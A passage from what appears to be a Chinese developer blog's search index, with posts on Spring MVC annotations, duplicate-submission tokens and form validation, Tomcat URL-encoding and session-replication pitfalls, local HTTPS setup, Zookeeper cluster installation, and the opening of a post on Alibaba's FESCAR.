PutMapping..<br>*Mapping的是Spring4.3加入的新注解，表示特定的请求类型路径映射，而不需要写RequestMethod来指定请求类型。</li></ul><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><pre class="line-numbers language-none"><code class="language-none">import org.dom4j.util.UserDataElement;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestBody;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.ResponseBody;@Controller@RequestMapping(&quot;&#x2F;test&quot;)public class TestController &#123;@RequestMapping(value &#x3D; &quot;&#x2F;get&#x2F;&#123;no&#125;&quot;, method &#x3D; RequestMethod.GET)@ResponseBodypublic Object get(@PathVariable(&quot;no&quot;) String no) &#123;return new UserDataElement(&quot;&quot;);&#125;@RequestMapping(value &#x3D; &quot;&#x2F;save&quot;, method &#x3D; RequestMethod.POST)public void save(@RequestBody UserDataElement user) &#123;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring MVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MVC 表单防重复提交</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20MVC/Spring%20MVC%20%E8%A1%A8%E5%8D%95%E9%98%B2%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20MVC/Spring%20MVC%20%E8%A1%A8%E5%8D%95%E9%98%B2%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/</url>
      
        <content type="html"><![CDATA[<p>利用Spring MVC的过滤器及token传递验证来实现表单防重复提交。</p><h2 id="创建注解"><a href="#创建注解" class="headerlink" title="创建注解"></a>创建注解</h2><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.METHOD)@Retention(RetentionPolicy.RUNTIME)@Documentedpublic @interface Token &#123;boolean create() default false;boolean remove() default false;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在跳转页面的方法上加上：@Token(create &#x3D; true)<br>在提交的action方法上加上：@Token(remove &#x3D; true)</p><h2 id="创建过滤器"><a href="#创建过滤器" class="headerlink" title="创建过滤器"></a>创建过滤器</h2><pre class="line-numbers language-none"><code class="language-none">public class TokenInterceptor extends HandlerInterceptorAdapter &#123;private Logger logger &#x3D; Logger.getLogger(TokenInterceptor.class);private static final String TOKEN &#x3D; &quot;token&quot;;@Overridepublic boolean preHandle(HttpServletRequest request, HttpServletResponse response,Object handler) throws Exception &#123;if (handler instanceof HandlerMethod) &#123;Method method &#x3D; ((HandlerMethod) handler).getMethod();Token annotation &#x3D; method.getAnnotation(Token.class);if (annotation !&#x3D; null) &#123;HttpSession session &#x3D; request.getSession();&#x2F;&#x2F; 创建tokenboolean create &#x3D; annotation.create();if (create) &#123;session.setAttribute(TOKEN, UUID.randomUUID().toString());return true;&#125;&#x2F;&#x2F; 删除tokenboolean remove &#x3D; annotation.remove();if (remove) &#123;if (isRepeatSubmit(request)) &#123;logger.warn(&quot;表单不能重复提交:&quot; + request.getRequestURL());return false;&#125;session.removeAttribute(TOKEN);&#125;&#125;&#125; else &#123;return super.preHandle(request, response, handler);&#125;return true;&#125;private boolean isRepeatSubmit(HttpServletRequest request) &#123;String token &#x3D; (String) request.getSession().getAttribute(TOKEN);if (token &#x3D;&#x3D; null) &#123;return true;&#125;String reqToken &#x3D; request.getParameter(TOKEN);if (reqToken &#x3D;&#x3D; null) &#123;return true;&#125;if (!token.equals(reqToken)) &#123;return true;&#125;return false;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置拦截器"><a href="#配置拦截器" class="headerlink" title="配置拦截器"></a>配置拦截器</h2><pre class="line-numbers language-none"><code class="language-none"><!--配置拦截器 -->  &lt;mvc:interceptors&gt;     &lt;mvc:interceptor&gt;      &lt;mvc:mapping path&#x3D;&quot;&#x2F;**&quot; &#x2F;&gt;     &lt;bean class&#x3D;&quot;com.example.web.interceptor.TokenInterceptor&quot;&#x2F;&gt;        &lt;&#x2F;mvc:interceptor&gt;&lt;&#x2F;mvc:interceptors&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="表单添加token"><a href="#表单添加token" class="headerlink" title="表单添加token"></a>表单添加token</h2><pre class="line-numbers language-none"><code class="language-none">&lt;input type&#x3D;&quot;hidden&quot; id&#x3D;&quot;token&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;$!&#123;session.getAttribute(&#39;token&#39;)&#125;&quot;&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在form表单里面添加token域，提交表单时需要传过去。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring MVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MVC 表单验证器</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20MVC/Spring%20MVC%20%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E5%99%A8/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20MVC/Spring%20MVC%20%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>本章讲解SpringMVC中怎么通过注解对表单参数进行验证。</p><h2 id="SpringBoot配置"><a href="#SpringBoot配置" class="headerlink" title="SpringBoot配置"></a>SpringBoot配置</h2><p>使用springboot，<code>spring-boot-starter-web</code>会自动引入<code>hiberante-validator</code>,<code>validation-api</code>依赖。</p><p>在<code>WebMvcConfigurerAdapter</code>实现类里面添加验证器及国际化指定资源文件。</p><pre class="line-numbers language-none"><code class="language-none">@Overridepublic Validator getValidator() &#123;LocalValidatorFactoryBean validator &#x3D; new LocalValidatorFactoryBean();validator.setValidationMessageSource(messageSource());return validator;&#125;@Beanpublic MessageSource messageSource() &#123;ResourceBundleMessageSource messageSource &#x3D; new ResourceBundleMessageSource();messageSource.setBasename(&quot;i18n&#x2F;ValidationMessages&quot;);messageSource.setDefaultEncoding(StandardCharsets.US_ASCII.name());return messageSource;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="验证器使用"><a href="#验证器使用" class="headerlink" title="验证器使用"></a>验证器使用</h2><p>接收参数的表单类：</p><pre class="line-numbers language-none"><code class="language-none">public class LoginForm &#123;@NotNull(message &#x3D; &quot;&#123;login.loginName.length&#125;&quot;)@Size(min &#x3D; 4, max &#x3D; 20, message &#x3D; &quot;&#123;login.loginName.length&#125;&quot;)private String loginName;@NotNull(message &#x3D; &quot;&#123;login.loginPassword.length&#125;&quot;)@Size(min &#x3D; 8, max &#x3D; 20, message &#x3D; &quot;&#123;login.loginPassword.length&#125;&quot;)private String loginPassword;public String getLoginName() &#123;return loginName;&#125;public void setLoginName(String loginName) &#123;this.loginName &#x3D; loginName;&#125;public String getLoginPassword() &#123;return loginPassword;&#125;public void setLoginPassword(String loginPassword) &#123;this.loginPassword &#x3D; loginPassword;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在要验证的字段上面加入验证注解，更多参考<code>validation-api</code>jar包下的<code>javax.validation.constraints</code>包。</p><p>SpringMVC控制器：</p><pre class="line-numbers language-none"><code class="language-none">@PostMapping(value &#x3D; &quot;&#x2F;login&quot;)public String login(@Validated LoginForm form) &#123;...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>@Validated</code>注解表示该参数需要验证。</p><h2 id="国际化"><a href="#国际化" class="headerlink" title="国际化"></a>国际化</h2><p>message里面<code>{}</code>引用的是国际化的资源。</p><p>添加国际化资源文件：</p><p>ValidationMessages.properties<br>ValidationMessages_zh_CN.properties</p><p>需要指定编码为<code>ASCII</code>，不然会乱码。</p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>异常全局处理时进行处理：</p><pre class="line-numbers language-none"><code class="language-none">@ControllerAdvicepublic class ExceptionResolver &#123;@ExceptionHandler(Throwable.class)@ResponseBodyObject handleEntityException(HttpServletRequest request, Throwable ex) &#123;    ...if (ex instanceof BindException) &#123;BindException c &#x3D; (BindException) ex;List&lt;ObjectError&gt; errors &#x3D; c.getBindingResult().getAllErrors();StringBuilder errorMsg &#x3D; new StringBuilder();errors.forEach(x -&gt; errorMsg.append(x.getDefaultMessage()).append(&quot;,&quot;));&#125;...&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者在验证的类后面加<code>BindingResult</code>，错误信息都会放在该对象里面，而不会抛出异常。如：</p><pre class="line-numbers language-none"><code class="language-none">@PostMapping(value &#x3D; &quot;&#x2F;login&quot;)public String login(@Validated LoginForm form, BindingResult bindingResult) &#123;...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring MVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat Get 请求的坑！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Tomcat/Tomcat%20Get%20%E8%AF%B7%E6%B1%82%E7%9A%84%E5%9D%91%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Tomcat/Tomcat%20Get%20%E8%AF%B7%E6%B1%82%E7%9A%84%E5%9D%91%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-2-27/1096232.jpg"></p><p><strong>Tomcat8.5，当Get请求中包含了未经编码的中文字符时，会报以下错误，请求未到应用程序在Tomcat层就被拦截了。</strong></p><p>Tomcat报错：</p><blockquote><p>java.lang.IllegalArgumentException: Invalid character found in the request target. The valid characters are defined in RFC 7230 and RFC 3986</p></blockquote><p>返回400错误：</p><blockquote><p>Transfer-Encoding—&gt;[chunked]<br>null—&gt;[HTTP&#x2F;1.1 400 Bad Request]<br>Server—&gt;[Apache-Coyote&#x2F;1.1]<br>Connection—&gt;[close]<br>Date—&gt;[Wed, 07 Feb 2018 03:19:04 GMT]</p></blockquote><p>根据错误找到了Tomcat最新的源码：</p><p>org&#x2F;apache&#x2F;coyote&#x2F;http11&#x2F;LocalStrings.properties</p><pre class="line-numbers language-none"><code class="language-none">iib.invalidRequestTarget&#x3D;Invalid character found in the request target. The valid characters are defined in RFC 7230 and RFC 3986<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>org&#x2F;apache&#x2F;coyote&#x2F;http11&#x2F;Http11InputBuffer.java</p><pre class="line-numbers language-none"><code class="language-none">boolean parseRequestLine(boolean keptAlive) throws IOException &#123;...     &#125; else if (HttpParser.isNotRequestTarget(chr)) &#123;        throw new IllegalArgumentException(sm.getString(&quot;iib.invalidRequestTarget&quot;));    &#125;...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>java&#x2F;org&#x2F;apache&#x2F;tomcat&#x2F;util&#x2F;http&#x2F;parser&#x2F;HttpParser.java</p><pre class="line-numbers language-none"><code class="language-none">public static boolean isNotRequestTarget(int c) &#123;    &#x2F;&#x2F; Fast for valid request target characters, slower for some incorrect    &#x2F;&#x2F; ones    try &#123;        return IS_NOT_REQUEST_TARGET[c];    &#125; catch (ArrayIndexOutOfBoundsException ex) &#123;        return true;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>查源码发现在Tomcat7.0.73就已经添加了RFC 3986这个规范。</strong></p><p>RFC 3986文档对Url的编解码问题做出了详细的建议，指出了哪些字符需要被编码才不会引起Url语义的转变，以及对为什么这些字符需要编码做出了相应的解释。</p><p>RFC 3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符（! * ‘ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ]）。</p><p>还有一些字符当直接放在Url中的时候，可能会引起解析程序的歧义，这些字符被视为不安全字符。</p><ul><li>空格：Url在传输的过程，或者用户在排版的过程，或者文本处理程序在处理Url的过程，都有可能引入无关紧要的空格，或者将那些有意义的空格给去掉。</li><li>引号以及&lt;&gt;：引号和尖括号通常用于在普通文本中起到分隔Url的作用</li><li>#：通常用于表示书签或者锚点</li><li>%：百分号本身用作对不安全字符进行编码时使用的特殊字符，因此本身需要编码</li><li>{}|^[]&#96;~：某一些网关或者传输代理会篡改这些字符</li></ul><p><strong>对于此问题，有以下几种解决方案。</strong></p><p>1、切换版本到7.0.73以下，这个不实际。</p><p>2、修改Tomcat源码，这个也不实际。</p><p>3、前端请求对URL编码。</p><p>4、修改Get方法为Post方法。</p><p>5、因{}是不安全字符，默认被 tomcat拦截。如果需要在URL中传输json数据，在catalina.properties中添加支持。</p><blockquote><p>tomcat.util.http.parser.HttpParser.requestTargetAllow&#x3D;|{}</p></blockquote><p><strong>总结</strong></p><p>如果Get请求在合作方，而合作方不愿意修改代码，那1、2种方法可以尝试。如果Get请求在自己，可以尝试3、4种方法。仅需要在URL上传输json数据，使用第5种方法即可。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat 集群 session 复制与 Oracle 的坑。。</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Tomcat/Tomcat%20%E9%9B%86%E7%BE%A4%20session%20%E5%A4%8D%E5%88%B6%E4%B8%8E%20Oracle%20%E7%9A%84%E5%9D%91%E3%80%82%E3%80%82/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Tomcat/Tomcat%20%E9%9B%86%E7%BE%A4%20session%20%E5%A4%8D%E5%88%B6%E4%B8%8E%20Oracle%20%E7%9A%84%E5%9D%91%E3%80%82%E3%80%82/</url>
      
        <content type="html"><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>公司某个系统使用了tomcat自带的集群session复制功能，然后后报了一个oracle驱动包里面的连接不能被序列化的异常。</p><pre class="line-numbers language-none"><code class="language-none">01-Nov-2017 16:45:26.653 SEVERE [https-jsse-nio-8443-exec-2] org.apache.catalina.ha.session.DeltaManager.requestCompleted Unable to serialize delta request for sessionid [F825A52DD9E0E7F8FD6BB3E3F721F841] java.io.NotSerializableException: oracle.jdbc.driver.T4CConnection    at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1183)    at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1547)    at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1508)    at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1431)    at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1177)    at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1547)    at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1508)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>看到这个问题，首先检查整个系统里面的代码有没有用到T4CConnection或者java.sql.Connection并将它们放到了session中。</p><p>检查后发现系统并没有用到任何及相关的类放在session中。</p><p>接下来就运维的同学头疼了，换tomcat版本、改各种tomcat相关的配置都没有解决。</p><p>然后我判断可能是程序或者数据导致的问题，果然，在经过逐一排查穷举测试，发现干掉某个对象后功能正常了，不报序列化的错误了。而在干掉的那个对象里面发现使用了java.sql.Clob类型，曾几何时在网上有看到过这个异常，在tomcat session复制时使用了这个类型的字段是会出问题的。</p><p>真是茅塞顿开，经常确认，那个Clob字段在实际应用中并没有使用到，所以最后去掉该字段，折腾了整个团队两三天的问题最终得已解决。</p><p>tomcat真是醉了，session复制你不支持Clob字段，你报一个oracle驱动不能序列化的错误，有点误导，让人迷失方向，还好问题解决了。。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一分钟开启 Tomcat https 支持</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Tomcat/%E4%B8%80%E5%88%86%E9%92%9F%E5%BC%80%E5%90%AF%20Tomcat%20https%20%E6%94%AF%E6%8C%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Tomcat/%E4%B8%80%E5%88%86%E9%92%9F%E5%BC%80%E5%90%AF%20Tomcat%20https%20%E6%94%AF%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h2 id="1、修改配置文件"><a href="#1、修改配置文件" class="headerlink" title="1、修改配置文件"></a>1、修改配置文件</h2><p>打开tomcat&#x2F;conf&#x2F;server.xml配置文件，把下面这段配置注释取消掉，<code>keystorePass</code>为证书密钥需要手动添加，创建证书时指定的。</p><pre class="line-numbers language-none"><code class="language-none">&lt;Connector port&#x3D;&quot;8443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11Protocol&quot;               maxThreads&#x3D;&quot;150&quot;                SSLEnabled&#x3D;&quot;true&quot;                scheme&#x3D;&quot;https&quot;                secure&#x3D;&quot;true&quot;               clientAuth&#x3D;&quot;false&quot;                sslProtocol&#x3D;&quot;TLS&quot;               keystorePass&#x3D;&quot;123456&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、创建证书"><a href="#2、创建证书" class="headerlink" title="2、创建证书"></a>2、创建证书</h2><p>使用jdk工具类里面的<code>keytool</code>命令来生成证书，按照提示输入相应的信息。</p><pre class="line-numbers language-none"><code class="language-none">C:\&gt;keytool -genkey -alias https -keyalg RSA输入密钥库口令:您的名字与姓氏是什么?  [Unknown]:  test您的组织单位名称是什么?  [Unknown]:  test您的组织名称是什么?  [Unknown]:  test您所在的城市或区域名称是什么?  [Unknown]:  test您所在的省&#x2F;市&#x2F;自治区名称是什么?  [Unknown]:  test该单位的双字母国家&#x2F;地区代码是什么?  [Unknown]:  testCN&#x3D;test, OU&#x3D;test, O&#x3D;test, L&#x3D;test, ST&#x3D;test, C&#x3D;test是否正确?  [否]:  y输入 &lt;https&gt; 的密钥口令        (如果和密钥库口令相同, 按回车):再次输入新口令:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的密钥口令就是配置文件中的<code>keystorePass</code>配置。</p><h2 id="访问https"><a href="#访问https" class="headerlink" title="访问https"></a>访问https</h2><p> 通过<code>https://localhost:8443/your-project</code>就能访问https项目。</p><p> 这种方式只适合本地开启https测试，线上环境需要购买商业授权的证书，不过原理都是一样的。 </p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zookeeper 集群安装配置，超详细！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Zookeeper/Zookeeper%20%E9%9B%86%E7%BE%A4%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%EF%BC%8C%E8%B6%85%E8%AF%A6%E7%BB%86%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Zookeeper/Zookeeper%20%E9%9B%86%E7%BE%A4%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%EF%BC%8C%E8%B6%85%E8%AF%A6%E7%BB%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>今天，栈长分享下 Zookeeper 的集群安装及配置。</p><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><blockquote><p>下载地址：<a href="http://zookeeper.apache.org/">http://zookeeper.apache.org/</a></p></blockquote><p>下载过程就不说了，我们下载了最新的<code>zookeeper-3.4.11</code>。</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><strong>1、上传安装包</strong></p><p>把下载的最新的包（如：zookeeper-3.4.11.tar.gz）上传到服务器，上传的方式也不多说了。</p><p><strong>2、解压</strong></p><pre class="line-numbers language-none"><code class="language-none">$ tar zxvf zookeeper-3.4.11.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>3、移动到&#x2F;usr&#x2F;local目录下</strong></p><pre class="line-numbers language-none"><code class="language-none">$ mv zookeeper-3.4.11 &#x2F;usr&#x2F;local&#x2F;zookeeper<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="集群配置"><a href="#集群配置" class="headerlink" title="集群配置"></a>集群配置</h4><p>Zookeeper集群原则上需要2n+1个实例才能保证集群有效性，所以集群规模至少是3台。</p><p>下面演示如何创建3台的Zookeeper集群，N台也是如此。</p><p><strong>1、创建数据文件存储目录</strong></p><pre class="line-numbers language-none"><code class="language-none">$ cd &#x2F;usr&#x2F;local&#x2F;zookeeper$ mkdir data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>2、添加主配置文件</strong></p><pre class="line-numbers language-none"><code class="language-none">$ cd conf$ cp zoo_sample.cfg zoo.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>3、修改配置</strong></p><pre class="line-numbers language-none"><code class="language-none">$ vi zoo.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先把<code>dataDir=/tmp/zookeeper</code>注释掉，然后添加以下核心配置。</p><pre class="line-numbers language-none"><code class="language-none">dataDir&#x3D;&#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;dataserver.1&#x3D;192.168.10.31:2888:3888server.2&#x3D;192.168.10.32:2888:3888server.3&#x3D;192.168.10.33:2888:3888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4、创建myid文件</strong></p><pre class="line-numbers language-none"><code class="language-none">$ cd ..&#x2F;data$ touch myid$ echo &quot;1&quot;&gt;&gt;myid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>每台机器的myid里面的值对应server.后面的数字x。</p><p><strong>5、开放3个端口</strong></p><pre class="line-numbers language-none"><code class="language-none">$ sudo &#x2F;sbin&#x2F;iptables -I INPUT -p tcp --dport 2181 -j ACCEPT$ sudo &#x2F;sbin&#x2F;iptables -I INPUT -p tcp --dport 2888 -j ACCEPT$ sudo &#x2F;sbin&#x2F;iptables -I INPUT -p tcp --dport 3888 -j ACCEPT$ sudo &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;iptables save$ sudo &#x2F;etc&#x2F;init.d&#x2F;iptables restart$ sudo &#x2F;sbin&#x2F;iptables -L -nChain INPUT (policy ACCEPT)target     prot opt source               destination         ACCEPT     tcp  --  0.0.0.0&#x2F;0            0.0.0.0&#x2F;0           tcp dpt:3888 ACCEPT     tcp  --  0.0.0.0&#x2F;0            0.0.0.0&#x2F;0           tcp dpt:2888 ACCEPT     tcp  --  0.0.0.0&#x2F;0            0.0.0.0&#x2F;0           tcp dpt:2181<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>6、配置集群其他机器</strong></p><p>把配置好的Zookeeper目录复制到其他两台机器上，重复上面4-5步。</p><pre class="line-numbers language-none"><code class="language-none">$ scp -r &#x2F;usr&#x2F;local&#x2F;zookeeper test@192.168.10.32:&#x2F;usr&#x2F;local&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>7、重启集群</strong></p><pre class="line-numbers language-none"><code class="language-none">$ &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3个Zookeeper都要启动。</p><p><strong>8、查看集群状态</strong></p><pre class="line-numbers language-none"><code class="language-none">$ &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh status ZooKeeper JMX enabled by defaultUsing config: &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfgMode: follower<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h4><pre class="line-numbers language-none"><code class="language-none">.&#x2F;zkCli.sh -server 192.168.10.31:2181<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接本机的不用带-server。</p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>如果是在单机创建的多个Zookeeper伪集群，需要对应修改配置中的端口、日志文件、数据文件位置等配置信息。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Zookeeper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 好戏连连，阿里又开源了一个分布式事务框架！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6/2019%20%E5%A5%BD%E6%88%8F%E8%BF%9E%E8%BF%9E%EF%BC%8C%E9%98%BF%E9%87%8C%E5%8F%88%E5%BC%80%E6%BA%90%E4%BA%86%E4%B8%80%E4%B8%AA%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E6%A1%86%E6%9E%B6%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6/2019%20%E5%A5%BD%E6%88%8F%E8%BF%9E%E8%BF%9E%EF%BC%8C%E9%98%BF%E9%87%8C%E5%8F%88%E5%BC%80%E6%BA%90%E4%BA%86%E4%B8%80%E4%B8%AA%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E6%A1%86%E6%9E%B6%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>最近，Github 宣布私库无限制免费使用了《<a href="https://mp.weixin.qq.com/s/XPk-5dSWLqgYf3KSlllcig">新年放大招：Github 私库免费了！</a>》，好戏还没演完，这两天阿里的分布式事务框架 GTS 又开源了，开源框架名叫：FESCAR，并发布了第一个开源版本：v0.1.0，大家苦于分布式事务无解的可以参考下这个开源框架，或者其思路对你有帮助。</p><p><img src="http://img.javastack.cn/19-1-11/63812479.jpg"></p><p>开源地址：</p><blockquote><p><a href="https://github.com/alibaba/fescar">https://github.com/alibaba/fescar</a></p></blockquote><h2 id="FESCAR-是什么？"><a href="#FESCAR-是什么？" class="headerlink" title="FESCAR 是什么？"></a>FESCAR 是什么？</h2><p>FESCAR（Fast &amp; Easy Commit And Rollback） 是一个用于微服务架构的分布式事务解决方案，它的特点是高性能且易于使用，旨在实现简单并快速的事务提交与回滚。</p><p><strong>微服务架构中的分布式事务问题：</strong></p><p>从传统的单体应用说起，假设一个单体应用的业务由 3 个模块构成，三者使用单个本地数据源。</p><p><img src="http://img.javastack.cn/19-1-11/25343210.jpg"></p><p>这样的话本地事务很自然就可以保证数据一致性。</p><p>但是在微服务架构中就不这么简单了，这 3 个模块被设计为 3 个不同数据源之上的 3 